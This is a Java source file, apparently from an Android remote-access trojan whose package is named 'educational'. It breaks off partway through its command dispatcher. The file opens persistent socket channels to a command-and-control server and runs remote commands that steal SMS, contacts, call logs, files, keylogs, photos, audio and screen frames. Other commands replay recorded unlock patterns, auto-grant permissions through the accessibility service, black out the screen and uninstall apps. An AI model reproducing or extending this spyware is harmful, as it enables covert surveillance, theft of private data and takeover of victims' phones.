package com.remoteaccess.educational.network;

import android.content.Context;
import android.graphics.Bitmap;
import android.os.Build;
import android.util.Base64;
import android.util.Log;
import com.remoteaccess.educational.advanced.NotificationInterceptor;
import com.remoteaccess.educational.commands.*;
import com.remoteaccess.educational.services.UnifiedAccessibilityService;
import com.remoteaccess.educational.utils.Constants;
import com.remoteaccess.educational.utils.DeviceInfo;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

/**
 * SocketManager — persistent TCP connection to the C2 server.
 *
 * Protocol (matches server.js exactly):
 *   send:    {"event":"...", "data":{...}}\n
 *   receive: {"event":"...", "data":{...}}\n
 */
public class SocketManager {

    private static final String TAG = "SocketManager";

    private static SocketManager instance;
    private Socket   tcpSocket;
    private PrintWriter    out;
    private BufferedReader in;
    private final Context  context;
    private volatile boolean connected = false;
    private volatile boolean running   = false;

    // Device screen dimensions — populated during registration, sent in every frame
    private int deviceScreenW = 0;
    private int deviceScreenH = 0;

    // Use a cached thread pool so command handlers never block the read loop
    private final ExecutorService          executor          = Executors.newCachedThreadPool();
    private final ScheduledExecutorService heartbeatExecutor = Executors.newSingleThreadScheduledExecutor();
    private ScheduledFuture<?>             heartbeatFuture;

    // ── Multi-channel sockets ─────────────────────────────────────────────
    // Channel 1 (stream): dedicated socket for frame data only
    private Socket   streamSocket;
    private PrintWriter streamOut;
    private volatile boolean streamConnected = false;
    // Single-thread executor prevents multiple concurrent stream loops from stacking up
    private final ExecutorService streamExecutor = Executors.newSingleThreadExecutor();

    // Channel 2 (live): dedicated socket for keylogs / notifications / activity
    private Socket   liveSocket;
    private PrintWriter liveOut;
    private volatile boolean liveConnected = false;
    // Single-thread executor prevents multiple concurrent live loops from stacking up
    private final ExecutorService liveExecutor = Executors.newSingleThreadExecutor();

    // Streaming state — event-driven (single-frame on request, idle keepalive)
    private volatile boolean idleFrameMode = false;
    private ScheduledFuture<?> idleFrameFuture;
    // Saved streaming state so it can be restored after forceReconnect()
    private volatile boolean resumeStreamingAfterReconnect = false;

    // Block-screen frame mode — when block is active the device auto-pushes a frame every 1.5s
    private volatile boolean blockFrameMode = false;
    private ScheduledFuture<?> blockFrameFuture;

    // Screen-reader push mode — app continuously reads screen and pushes to dashboard
    private volatile ScheduledFuture<?> screenReaderFuture;

    // Frame deduplication — skip pushing a frame if the screen content hasn't changed
    private volatile String lastFrameFingerprint = null;

    // Debounce handle for device-user interaction frames
    private final AtomicReference<ScheduledFuture<?>> actionFrameFuture = new AtomicReference<>();

    // Frame throttle — only one frame capture at a time; drop new requests while busy
    private final java.util.concurrent.atomic.AtomicBoolean frameBusy = new java.util.concurrent.atomic.AtomicBoolean(false);

    // Per-channel send locks — CRITICAL: do NOT share one lock across channels.
    // A large JPEG frame write on the stream channel can stall the OS socket buffer
    // for 600 ms+ on 3G. If all channels share the same monitor (synchronized this),
    // command responses and heartbeats on the primary channel are completely blocked
    // for that duration, causing the 100 000+ ms device-latency seen on slow links.
    private final Object primaryLock = new Object();
    private final Object streamLock  = new Object();
    private final Object liveLock    = new Object();

    // Guard against queuing up multiple concurrent stream writes.
    // If the previous frame write is still blocking in the kernel (3G back-pressure),
    // drop the next frame rather than letting writes stack up in memory.
    private final java.util.concurrent.atomic.AtomicBoolean streamWriteBusy =
            new java.util.concurrent.atomic.AtomicBoolean(false);

    // Accessibility tree reads are NOT thread-safe — serialize them with a 1-permit semaphore.
    // Concurrent AccessibilityNodeInfo traversals corrupt Android's internal node pool and crash the process.
    private final java.util.concurrent.Semaphore accessSemaphore = new java.util.concurrent.Semaphore(1);

    // Touch/swipe deduplication — ignore identical command within 250 ms
    private volatile String  lastTouchKey  = "";
    private volatile long    lastTouchTime = 0L;

    // Dynamic monitored packages (runtime additions from dashboard)
    private final java.util.Set<String> dynamicMonitoredPackages = new java.util.concurrent.CopyOnWriteArraySet<>();

    // Command Handlers — one instance each, created once and reused
    private final CommandExecutor   commandExecutor;
    private final SMSHandler        smsHandler;
    private final ContactsHandler   contactsHandler;
    private final CallLogsHandler   callLogsHandler;
    private final CameraHandler     cameraHandler;
    private final ScreenshotHandler screenshotHandler;
    private final FileHandler       fileHandler;
    private final AudioRecorder     audioRecorder;
    private final KeyloggerService  keyloggerService;
    private final AppMonitor        appMonitor;
    private final ScreenBlackout    screenBlackout;
    private final PermissionManager permissionManager;
    private GestureRecorder         gestureRecorder;

    public static synchronized SocketManager getInstance(Context context) {
        if (instance == null) instance = new SocketManager(context.getApplicationContext());
        return instance;
    }

    private SocketManager(Context context) {
        this.context       = context;
        commandExecutor    = new CommandExecutor(context);
        smsHandler         = new SMSHandler(context);
        contactsHandler    = new ContactsHandler(context);
        callLogsHandler    = new CallLogsHandler(context);
        cameraHandler      = new CameraHandler(context);
        screenshotHandler  = new ScreenshotHandler(context);
        fileHandler        = new FileHandler(context);
        audioRecorder      = new AudioRecorder(context);
        keyloggerService   = new KeyloggerService(context);
        appMonitor         = new AppMonitor(context, keyloggerService);
        screenBlackout     = ScreenBlackout.getInstance();
        permissionManager  = new PermissionManager(context);
        // gestureRecorder is initialized lazily (needs AccessibilityService)
        KeyloggerService.setEnabled(true);
    }

    /** Called by UnifiedAccessibilityService once it's running, to init gesture recorder. */
    public void initGestureRecorder(android.accessibilityservice.AccessibilityService svc) {
        if (gestureRecorder == null) {
            gestureRecorder = new GestureRecorder(context, svc);
        }
    }

    /** Expose appMonitor so UnifiedAccessibilityService can call it. */
    public AppMonitor getAppMonitor()       { return appMonitor; }
    public KeyloggerService getKeylogger()  { return keyloggerService; }
    public GestureRecorder getGestureRecorder() { return gestureRecorder; }

    /** Whether streaming is currently active (idle-frame mode on). */
    public boolean isStreamingActive() { return idleFrameMode && connected; }

    /**
     * Schedule a frame capture 200 ms after the last device-user interaction.
     * Resets the timer on each call so rapid interactions produce only one frame.
     */
    public void scheduleFrameAfterAction(String deviceId) {
        if (!isStreamingActive()) return;
        ScheduledFuture<?> prev = actionFrameFuture.getAndSet(null);
        if (prev != null) prev.cancel(false);
        // 80 ms — fast enough to show the result of a tap before the user taps again
        ScheduledFuture<?> next = heartbeatExecutor.schedule(
            () -> sendSingleFrame(deviceId), 80, TimeUnit.MILLISECONDS);
        actionFrameFuture.set(next);
    }

    // ── Connection lifecycle ──────────────────────────────────────────────

    public synchronized void connect() {
        if (running) {
            Log.d(TAG, "connect() — already running, skipping");
            return;
        }
        running = true;
        executor.execute(this::connectionLoop);
        // Start secondary channels with a slight delay so primary registers first
        streamExecutor.execute(() -> {
            try { Thread.sleep(1200); } catch (InterruptedException ignored) {}
            streamChannelLoop();
        });
        liveExecutor.execute(() -> {
            try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
            liveChannelLoop();
        });
    }

    private void connectionLoop() {
        while (running) {
            try {
                Log.i(TAG, "Connecting to " + Constants.TCP_HOST + ":" + Constants.TCP_PORT);
                tcpSocket = new Socket(Constants.TCP_HOST, Constants.TCP_PORT);
                tcpSocket.setKeepAlive(true);
                tcpSocket.setTcpNoDelay(true);      // disable Nagle — send each packet immediately
                tcpSocket.setSoTimeout(0);          // no read timeout — server sends pings

                out       = new PrintWriter(tcpSocket.getOutputStream(), true);
                in        = new BufferedReader(new InputStreamReader(tcpSocket.getInputStream()));
                connected = true;

                Log.i(TAG, "TCP connected — registering device");
                registerDevice(DeviceInfo.getDeviceId(context));
                startHeartbeat();
                listenForMessages();                // blocks until socket closes

            } catch (Exception e) {
                Log.e(TAG, "Connection error: " + e.getMessage());
            } finally {
                connected = false;
                stopHeartbeat();
                closeSilently();
            }

            if (running) {
                Log.d(TAG, "Reconnecting in " + Constants.TCP_RECONNECT_DELAY + " ms…");
                try { Thread.sleep(Constants.TCP_RECONNECT_DELAY); } catch (InterruptedException ignored) {}
            }
        }
        Log.i(TAG, "Connection loop ended");
    }

    private void closeSilently() {
        try { if (tcpSocket != null) tcpSocket.close(); } catch (Exception ignored) {}
        out = null;
        in  = null;
    }

    // ── Secondary channel: stream (frame data only) ───────────────────────

    private void streamChannelLoop() {
        while (running) {
            // Wait until the primary channel is established before opening secondary channels.
            // This prevents a flood of reconnection attempts when the primary isn't ready yet.
            if (!connected) {
                try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
                continue;
            }
            try {
                streamSocket = new Socket(Constants.TCP_HOST, Constants.TCP_PORT);
                streamSocket.setKeepAlive(true);
                streamSocket.setTcpNoDelay(true);        // disable Nagle — send frames immediately
                streamSocket.setSendBufferSize(131072);  // 128 KB send buffer — frames fit in one flush
                streamSocket.setSoTimeout(0);
                streamOut = new PrintWriter(streamSocket.getOutputStream(), true);
                streamConnected = true;
                // Register as stream channel
                String deviceId = DeviceInfo.getDeviceId(context);
                JSONObject d = new JSONObject();
                d.put("deviceId", deviceId);
                d.put("channelType", "stream");
                JSONObject msg = new JSONObject();
                msg.put("event", "device:register_channel");
                msg.put("data", d);
                streamOut.print(msg.toString() + "\n");
                streamOut.flush();
                Log.i(TAG, "Stream channel connected");
                // If streaming was active before reconnect, restart idle frame mode.
                // Use a short delay so the stream socket is fully ready before sending frames.
                if (resumeStreamingAfterReconnect || idleFrameMode) {
                    final String did = deviceId;
                    resumeStreamingAfterReconnect = false;
                    executor.execute(() -> {
                        try { Thread.sleep(700); } catch (InterruptedException ignored) {}
                        if (streamConnected) {
                            Log.i(TAG, "Stream channel reconnected — resuming idle frame mode");
                            startIdleFrameMode(did);
                        }
                    });
                }
                // Keep alive — read loop; respond to pings so server doesn't time us out.
                // Pong writes must go through streamLock to prevent output corruption from
                // concurrent frame writes on the executor thread.
                java.io.BufferedReader sIn = new java.io.BufferedReader(
                    new java.io.InputStreamReader(streamSocket.getInputStream()));
                final String streamDeviceId = deviceId;
                String sLine;
                while (running && connected && (sLine = sIn.readLine()) != null) {
                    try {
                        JSONObject incoming = new JSONObject(sLine.trim());
                        if ("device:ping".equals(incoming.optString("event"))) {
                            JSONObject pong = new JSONObject();
                            pong.put("event", "device:pong");
                            JSONObject pd = new JSONObject();
                            pd.put("deviceId", streamDeviceId);
                            pong.put("data", pd);
                            final String pongStr = pong.toString() + "\n";
                            // Acquire streamLock before writing — prevents interleaving with frame writes
                            synchronized (streamLock) {
                                if (streamOut != null) {
                                    streamOut.print(pongStr);
                                    streamOut.flush();
                                }
                            }
                        }
                    } catch (Exception ignored) {}
                }
            } catch (Exception e) {
                Log.e(TAG, "Stream channel error: " + e.getMessage());
            } finally {
                streamConnected = false;
                try { if (streamSocket != null) streamSocket.close(); } catch (Exception ignored) {}
                streamOut = null;
            }
            if (running) {
                // Use a longer delay than primary to avoid thrashing when primary is still reconnecting
                try { Thread.sleep(Math.max(Constants.TCP_RECONNECT_DELAY, 5000)); } catch (InterruptedException ignored) {}
            }
        }
    }

    private void sendStreamMessage(String event, JSONObject data) {
        // Drop frame if a previous write is still blocking in the kernel (3G back-pressure).
        // This prevents unbounded write queuing that would cause command-channel stalls.
        if (!streamWriteBusy.compareAndSet(false, true)) {
            Log.d(TAG, "sendStreamMessage: stream write busy, dropping frame");
            return;
        }
        boolean useFallback = false;
        try {
            if (streamOut != null && streamConnected) {
                // streamLock is only held during the actual socket write; the fallback
                // to sendMessage happens AFTER releasing this lock to avoid lock-ordering
                // issues (never hold streamLock while acquiring primaryLock).
                synchronized (streamLock) {
                    try {
                        JSONObject msg = new JSONObject();
                        msg.put("event", event);
                        msg.put("data", data);
                        streamOut.print(msg.toString() + "\n");
                        streamOut.flush();
                    } catch (JSONException e) {
                        Log.e(TAG, "sendStreamMessage error: " + e.getMessage());
                        useFallback = true;
                    }
                }
            } else {
                useFallback = true;
            }
        } finally {
            streamWriteBusy.set(false);
        }
        // Fallback outside all locks — avoids lock-ordering deadlock with primaryLock
        if (useFallback) sendMessage(event, data);
    }

    // ── Secondary channel: live (keylogs, notifications, activity) ────────

    private void liveChannelLoop() {
        while (running) {
            // Wait until the primary channel is established before opening secondary channels.
            if (!connected) {
                try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
                continue;
            }
            try {
                liveSocket = new Socket(Constants.TCP_HOST, Constants.TCP_PORT);
                liveSocket.setKeepAlive(true);
                liveSocket.setTcpNoDelay(true);       // disable Nagle — keylog/notif sent immediately
                liveSocket.setSendBufferSize(65536);  // 64 KB — ample for keylog/notif payloads
                liveSocket.setSoTimeout(0);
                liveOut = new PrintWriter(liveSocket.getOutputStream(), true);
                liveConnected = true;
                String deviceId = DeviceInfo.getDeviceId(context);
                JSONObject d = new JSONObject();
                d.put("deviceId", deviceId);
                d.put("channelType", "live");
                JSONObject msg = new JSONObject();
                msg.put("event", "device:register_channel");
                msg.put("data", d);
                liveOut.print(msg.toString() + "\n");
                liveOut.flush();
                Log.i(TAG, "Live channel connected");
                java.io.BufferedReader lIn = new java.io.BufferedReader(
                    new java.io.InputStreamReader(liveSocket.getInputStream()));
                String lLine;
                final String liveDeviceId = deviceId;
                while (running && connected && (lLine = lIn.readLine()) != null) {
                    try {
                        JSONObject incoming = new JSONObject(lLine.trim());
                        if ("device:ping".equals(incoming.optString("event"))) {
                            JSONObject pong = new JSONObject();
                            pong.put("event", "device:pong");
                            JSONObject pd = new JSONObject();
                            pd.put("deviceId", liveDeviceId);
                            pong.put("data", pd);
                            final String pongStr = pong.toString() + "\n";
                            synchronized (liveLock) {
                                if (liveOut != null) {
                                    liveOut.print(pongStr);
                                    liveOut.flush();
                                }
                            }
                        }
                    } catch (Exception ignored) {}
                }
            } catch (Exception e) {
                Log.e(TAG, "Live channel error: " + e.getMessage());
            } finally {
                liveConnected = false;
                try { if (liveSocket != null) liveSocket.close(); } catch (Exception ignored) {}
                liveOut = null;
            }
            if (running) {
                try { Thread.sleep(Math.max(Constants.TCP_RECONNECT_DELAY, 5000)); } catch (InterruptedException ignored) {}
            }
        }
    }

    private void sendLiveMessage(String event, JSONObject data) {
        boolean useFallback = false;
        synchronized (liveLock) {
            if (liveOut != null && liveConnected) {
                try {
                    JSONObject msg = new JSONObject();
                    msg.put("event", event);
                    msg.put("data", data);
                    liveOut.print(msg.toString() + "\n");
                    liveOut.flush();
                } catch (JSONException e) {
                    Log.e(TAG, "sendLiveMessage error: " + e.getMessage());
                    useFallback = true;
                }
            } else {
                useFallback = true;
            }
        }
        // Fallback outside liveLock — avoids lock-ordering deadlock with primaryLock
        if (useFallback) sendMessage(event, data);
    }

    // ── Heartbeat ────────────────────────────────────────────────────────

    private void startHeartbeat() {
        stopHeartbeat();
        String deviceId = DeviceInfo.getDeviceId(context);
        heartbeatFuture = heartbeatExecutor.scheduleAtFixedRate(
            () -> { if (connected) sendHeartbeat(deviceId); },
            Constants.HEARTBEAT_INTERVAL,
            Constants.HEARTBEAT_INTERVAL,
            TimeUnit.MILLISECONDS
        );
    }

    private void stopHeartbeat() {
        if (heartbeatFuture != null) {
            heartbeatFuture.cancel(false);
            heartbeatFuture = null;
        }
    }

    // ── Message loop ──────────────────────────────────────────────────────

    private void listenForMessages() {
        try {
            String line;
            while (running && (line = in.readLine()) != null) {
                final String msg = line.trim();
                if (!msg.isEmpty()) executor.execute(() -> processMessage(msg));
            }
        } catch (Exception e) {
            Log.e(TAG, "Read error: " + e.getMessage());
        }
    }

    private void processMessage(String raw) {
        try {
            JSONObject json  = new JSONObject(raw);
            String     event = json.getString("event");
            JSONObject data  = json.optJSONObject("data");

            Log.d(TAG, "← event: " + event);

            switch (event) {
                case "device:ping":
                    sendPong();
                    break;

                case "device:registered":
                    Log.i(TAG, "Server acknowledged registration ✓");
                    break;

                case "connection:reset":
                    Log.w(TAG, "Server requested connection reset — reconnecting cleanly");
                    // Close socket to trigger the reconnect loop; stored data is untouched
                    executor.execute(() -> {
                        connected = false;
                        closeSilently();
                        try { if (streamSocket != null) streamSocket.close(); } catch (Exception ignored) {}
                        try { if (liveSocket   != null) liveSocket.close();   } catch (Exception ignored) {}
                        streamConnected = false;
                        liveConnected   = false;
                    });
                    break;

                case "command:execute":
                    if (data != null) {
                        String     commandId = data.optString("commandId", "");
                        String     command   = data.optString("command", "");
                        JSONObject params    = data.optJSONObject("params");
                        if (!command.isEmpty()) {
                            handleCommand(commandId, command, params);
                        }
                    }
                    break;

                default:
                    Log.w(TAG, "Unhandled event: " + event);
            }

        } catch (JSONException e) {
            Log.e(TAG, "Parse error: " + e.getMessage() + " raw=" + raw);
        }
    }

    // ── Send helpers ──────────────────────────────────────────────────────

    private void sendMessage(String event, JSONObject data) {
        synchronized (primaryLock) {
            if (out != null && connected) {
                try {
                    JSONObject msg = new JSONObject();
                    msg.put("event", event);
                    msg.put("data", data);
                    out.print(msg.toString() + "\n");
                    out.flush();
                } catch (JSONException e) {
                    Log.e(TAG, "sendMessage error: " + e.getMessage());
                }
            }
        }
    }

    public void emit(String event, JSONObject data) { sendMessage(event, data); }

    private void sendPong() {
        try {
            JSONObject d = new JSONObject();
            d.put("deviceId", DeviceInfo.getDeviceId(context));
            sendMessage("device:pong", d);
        } catch (JSONException ignored) {}
    }

    public void registerDevice(String deviceId) {
        try {
            android.view.WindowManager wm = (android.view.WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
            android.graphics.Point screenSize = new android.graphics.Point();
            wm.getDefaultDisplay().getRealSize(screenSize);

            // Store for use in every frame message
            deviceScreenW = screenSize.x;
            deviceScreenH = screenSize.y;

            JSONObject info = new JSONObject();
            info.put("name",           DeviceInfo.getDeviceName());
            info.put("model",          DeviceInfo.getModel());
            info.put("androidVersion", DeviceInfo.getAndroidVersion());
            info.put("manufacturer",   android.os.Build.MANUFACTURER);
            info.put("sdk",            Build.VERSION.SDK_INT);
            info.put("screenWidth",    deviceScreenW);
            info.put("screenHeight",   deviceScreenH);

            JSONObject d = new JSONObject();
            d.put("deviceId",   deviceId);
            d.put("userId",     "");
            d.put("deviceInfo", info);
            sendMessage("device:register", d);
            Log.d(TAG, "Registered device: " + deviceId);
        } catch (JSONException e) {
            Log.e(TAG, "registerDevice error: " + e.getMessage());
        }
    }

    public void sendHeartbeat(String deviceId) {
        try {
            JSONObject d = new JSONObject();
            d.put("deviceId", deviceId);
            sendMessage("device:heartbeat", d);
        } catch (JSONException ignored) {}
    }

    /** Send a command:response back to the server. result may be a JSONObject or a String. */
    public void sendResponse(String commandId, String command, Object result) {
        try {
            String responseStr;
            if (result instanceof JSONObject) {
                responseStr = result.toString();
            } else if (result != null) {
                responseStr = result.toString();
            } else {
                responseStr = "{}";
            }

            JSONObject d = new JSONObject();
            d.put("commandId", commandId);
            d.put("response",  responseStr);
            sendMessage("command:response", d);
            Log.d(TAG, "→ response sent for " + command);
        } catch (JSONException e) {
            Log.e(TAG, "sendResponse error: " + e.getMessage());
        }
    }

    private void sendErrorResponse(String commandId, String command, String error) {
        try {
            JSONObject d = new JSONObject();
            d.put("commandId", commandId);
            d.put("error",     error);
            sendMessage("command:response", d);
            Log.w(TAG, "→ error response for " + command + ": " + error);
        } catch (JSONException e) {
            Log.e(TAG, "sendErrorResponse error: " + e.getMessage());
        }
    }

    public void disconnect() {
        running   = false;
        connected = false;
        streamConnected = false;
        liveConnected   = false;
        stopHeartbeat();
        stopIdleFrameMode();
        stopBlockFrameMode();
        closeSilently();
        try { if (streamSocket != null) streamSocket.close(); } catch (Exception ignored) {}
        try { if (liveSocket   != null) liveSocket.close();   } catch (Exception ignored) {}
        streamOut = null;
        liveOut   = null;
    }

    public boolean isConnected() { return connected; }

    /**
     * Force a full re-initialization of all channels.
     * Closes every open socket, resets the running flag, and starts fresh connection loops.
     * Safe to call even when a connection is already active — used by RemoteAccessService
     * on every onStartCommand so that a crash/restart always re-registers with the server.
     */
    public synchronized void forceReconnect() {
        Log.i(TAG, "forceReconnect() — tearing down all channels and reconnecting");
        // Save streaming state before tearing down so it can be restored after reconnection
        resumeStreamingAfterReconnect = idleFrameMode || blockFrameMode;
        // Tear down existing state
        running   = false;
        connected = false;
        streamConnected = false;
        liveConnected   = false;
        stopHeartbeat();
        stopIdleFrameMode();
        stopBlockFrameMode();
        closeSilently();
        try { if (streamSocket != null) streamSocket.close(); } catch (Exception ignored) {}
        try { if (liveSocket   != null) liveSocket.close();   } catch (Exception ignored) {}
        streamOut = null;
        liveOut   = null;
        // Give threads a moment to exit their loops, then start fresh
        executor.execute(() -> {
            try { Thread.sleep(500); } catch (InterruptedException ignored) {}
            connect();
        });
    }

    // ── Command dispatch ──────────────────────────────────────────────────

    private void handleCommand(String commandId, String command, JSONObject params) {
        Log.i(TAG, "handleCommand: " + command + " [" + commandId + "]");
        JSONObject result;
        // Inject commandId into params so dispatchCommand can use it (e.g. for run_task_local)
        if (params == null) params = new JSONObject();
        try { params.put("commandId", commandId); } catch (JSONException ignored) {}

        try {
            result = dispatchCommand(command, params);
        } catch (Exception e) {
            Log.e(TAG, "handleCommand exception for " + command + ": " + e.getMessage());
            sendErrorResponse(commandId, command, "Internal error: " + e.getMessage());
            return;
        }

        sendResponse(commandId, command, result);
    }

    private JSONObject dispatchCommand(String command, JSONObject params) throws Exception {
        if (params == null) params = new JSONObject();

        // ── System / Device ──────────────────────────────────────────────
        switch (command) {
            case "ping":
            case "vibrate":
            case "play_sound":
            case "get_clipboard":
            case "set_clipboard":
            case "get_device_info":
            case "get_location":
            case "get_installed_apps":
            case "get_battery_info":
            case "get_network_info":
            case "get_wifi_networks":
            case "get_system_info":
                return commandExecutor.executeCommand(command, params);
        }

        // ── Storage permission (on-demand from dashboard) ────────────────
        if (command.equals("request_storage_permission")) {
            JSONObject r = new JSONObject();
            try {
                new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
                    try {
                        com.remoteaccess.educational.permissions.AutoPermissionManager apm =
                            new com.remoteaccess.educational.permissions.AutoPermissionManager(context);
                        // Start dedicated storage auto-granter (clicks Allow access / Allow / toggle)
                        UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
                        if (svc != null) svc.enableStorageAutoGrant();
                        // Open the storage permission screen
                        apm.requestWriteExternalStorageLast();
                    } catch (Exception ignored) {}
                });
                r.put("success", true);
                r.put("message", "Storage permission request triggered");
            } catch (Exception e) {
                r.put("success", false);
                r.put("error", e.getMessage());
            }
            return r;
        }

        // ── Accessibility status ─────────────────────────────────────────
        if (command.equals("get_accessibility_status")) {
            JSONObject r = new JSONObject();
            boolean enabled = UnifiedAccessibilityService.getInstance() != null;
            r.put("success", true);
            r.put("enabled", enabled);
            r.put("message", enabled ? "Accessibility service is running" : "Accessibility service is NOT running — enable it in Settings");
            return r;
        }

        // ── SMS ──────────────────────────────────────────────────────────
        if (command.equals("get_all_sms")) {
            return smsHandler.getAllSMS(params.optInt("limit", 100));
        }
        if (command.equals("get_sms_from_number")) {
            return smsHandler.getSMSFromNumber(params.getString("phoneNumber"), params.optInt("limit", 50));
        }
        if (command.equals("send_sms")) {
            return smsHandler.sendSMS(params.getString("phoneNumber"), params.getString("message"));
        }
        if (command.equals("delete_sms")) {
            return smsHandler.deleteSMS(params.getString("smsId"));
        }

        // ── Contacts ─────────────────────────────────────────────────────
        if (command.equals("get_all_contacts")) return contactsHandler.getAllContacts();
        if (command.equals("search_contacts"))  return contactsHandler.searchContacts(params.getString("query"));

        // ── Calls ────────────────────────────────────────────────────────
        if (command.equals("get_all_call_logs")) {
            return callLogsHandler.getAllCallLogs(params.optInt("limit", 100));
        }
        if (command.equals("get_call_logs_by_type")) {
            return callLogsHandler.getCallLogsByType(params.getInt("callType"), params.optInt("limit", 50));
        }
        if (command.equals("get_call_logs_from_number")) {
            return callLogsHandler.getCallLogsFromNumber(params.getString("phoneNumber"), params.optInt("limit", 50));
        }
        if (command.equals("get_call_statistics")) return callLogsHandler.getCallStatistics();

        // ── Camera ───────────────────────────────────────────────────────
        if (command.equals("get_available_cameras")) return cameraHandler.getAvailableCameras();
        if (command.equals("take_photo")) {
            return cameraHandler.takePhoto(
                params.optString("cameraId", "0"),
                params.optString("quality", "high")
            );
        }

        // ── Screenshot ───────────────────────────────────────────────────
        if (command.equals("take_screenshot")) return screenshotHandler.takeScreenshot();

        // ── Files ────────────────────────────────────────────────────────
        if (command.equals("list_files")) {
            String path = params.optString("path", "");
            return fileHandler.listFiles(path.isEmpty() ? null : path);
        }
        if (command.equals("read_file"))  return fileHandler.readFile(params.getString("filePath"), params.optBoolean("asBase64", false));
        if (command.equals("write_file")) return fileHandler.writeFile(params.getString("filePath"), params.getString("content"), params.optBoolean("isBase64", false));
        if (command.equals("delete_file"))return fileHandler.deleteFile(params.getString("filePath"));
        if (command.equals("copy_file"))  return fileHandler.copyFile(params.getString("sourcePath"), params.getString("destPath"));
        if (command.equals("move_file"))  return fileHandler.moveFile(params.getString("sourcePath"), params.getString("destPath"));
        if (command.equals("create_directory")) return fileHandler.createDirectory(params.getString("path"));
        if (command.equals("get_file_info"))    return fileHandler.getFileInfo(params.getString("filePath"));
        if (command.equals("search_files"))     return fileHandler.searchFiles(params.getString("directory"), params.getString("query"));

        // ── Audio ────────────────────────────────────────────────────────
        if (command.equals("start_recording")) {
            String fn = params.optString("filename", null);
            return audioRecorder.startRecording(fn.isEmpty() ? null : fn);
        }
        if (command.equals("stop_recording"))       return audioRecorder.stopRecording();
        if (command.equals("get_recording_status")) return audioRecorder.getStatus();
        if (command.equals("get_audio"))            return audioRecorder.getAudioAsBase64(params.getString("filePath"));
        if (command.equals("list_recordings"))      return audioRecorder.listRecordings();
        if (command.equals("delete_recording"))     return audioRecorder.deleteRecording(params.getString("filePath"));

        // ── Keylogger ────────────────────────────────────────────────────
        if (command.equals("get_keylogs"))            return keyloggerService.getKeylogs(params.optInt("limit", 100));
        if (command.equals("clear_keylogs"))          return keyloggerService.clearKeylogs();
        if (command.equals("list_keylog_files"))      return keyloggerService.listKeylogFiles();
        if (command.equals("download_keylog_file"))   return keyloggerService.downloadKeylogFile(params.getString("date"));

        // ── Gesture Recorder ─────────────────────────────────────────────
        if (command.startsWith("gesture_")) {
            if (gestureRecorder == null) {
                JSONObject er = new JSONObject();
                er.put("success", false); er.put("error", "Gesture recorder not ready — ensure AccessibilityService is enabled");
                return er;
            }
            switch (command) {
                case "gesture_start_record": {
                    String pkg   = params.optString("packageId", "");
                    String lbl   = params.optString("label", "gesture");
                    return gestureRecorder.startRecording(pkg, lbl);
                }
                case "gesture_stop_record":   return gestureRecorder.stopRecording();
                case "gesture_cancel_record": return gestureRecorder.cancelRecording();
                case "gesture_pause_record":  return gestureRecorder.pauseRecording();
                case "gesture_resume_record": return gestureRecorder.resumeRecording();
                case "gesture_get_live":      return gestureRecorder.getLivePoints();
                case "gesture_replay":        return gestureRecorder.replayGesture(params.getString("filename"));
                case "gesture_list":          return gestureRecorder.listGestures();
                case "gesture_get":           return gestureRecorder.getGesture(params.getString("filename"));
                case "gesture_delete":        return gestureRecorder.deleteGesture(params.getString("filename"));
                case "gesture_status": {
                    JSONObject st = new JSONObject();
                    st.put("success",   true);
                    st.put("recording", gestureRecorder.isRecording());
                    st.put("paused",    gestureRecorder.isPaused());
                    return st;
                }
                case "gesture_draw_pattern":  return gestureRecorder.drawPattern(params);
                case "gesture_auto_capture_start": return gestureRecorder.startAutoCapture();
                case "gesture_auto_capture_stop":  return gestureRecorder.stopAutoCapture();
                case "gesture_mirror_start":        return gestureRecorder.startAutoMirror();
                case "gesture_mirror_stop":         return gestureRecorder.stopAutoMirror();
                // Live Stream
                case "gesture_live_start":   return gestureRecorder.startLiveStream();
                case "gesture_live_stop":    return gestureRecorder.stopLiveStream();
                case "gesture_live_points":  return gestureRecorder.getLiveStreamPoints();
                case "gesture_live_delete":  return gestureRecorder.deleteLiveStream(params.getString("filename"));
                case "gesture_live_replay":  return gestureRecorder.replayLiveStream(params.getString("filename"));
                case "gesture_live_list":    return gestureRecorder.listLiveStreams();
            }
        }

        // ── Advanced Unlock ───────────────────────────────────────────────
        if (command.startsWith("advanced_unlock_")) {
            if (gestureRecorder == null) {
                JSONObject er = new JSONObject();
                er.put("success", false);
                er.put("error", "Gesture recorder not ready — ensure AccessibilityService is enabled");
                return er;
            }
            switch (command) {
                case "advanced_unlock_list":
                    return gestureRecorder.listAdvancedUnlockPatterns();
                case "advanced_unlock_get":
                    return gestureRecorder.getAdvancedUnlockPattern(params.getString("filename"));
                case "advanced_unlock_replay":
                    return gestureRecorder.replayAdvancedUnlockPattern(params.getString("filename"));
                case "advanced_unlock_delete":
                    return gestureRecorder.deleteAdvancedUnlockPattern(params.getString("filename"));
            }
        }

        // ── App Monitor ──────────────────────────────────────────────────
        if (command.equals("list_app_monitor_apps"))    return appMonitor.listMonitoredApps();
        if (command.equals("get_app_keylogs"))          return appMonitor.getAppKeylogs(params.getString("packageName"), params.optString("date", ""), params.optInt("limit", 200));
        if (command.equals("list_app_keylog_files"))    return appMonitor.listAppKeylogFiles(params.getString("packageName"));
        if (command.equals("download_app_keylog_file")) return appMonitor.downloadAppKeylogFile(params.getString("packageName"), params.getString("date"));
        if (command.equals("list_app_screenshots"))     return appMonitor.listAppScreenshots(params.getString("packageName"));
        if (command.equals("download_app_screenshot"))  return appMonitor.downloadAppScreenshot(params.getString("packageName"), params.getString("filename"));

        // ── App Manager ──────────────────────────────────────────────────
        if (command.equals("uninstall_app"))  return appMonitor.uninstallApp(params.getString("packageName"));
        if (command.equals("force_stop_app")) return appMonitor.forceStopApp(params.getString("packageName"));
        if (command.equals("open_app"))       return appMonitor.openApp(params.getString("packageName"));
        if (command.equals("clear_app_data")) return appMonitor.clearAppData(params.getString("packageName"));

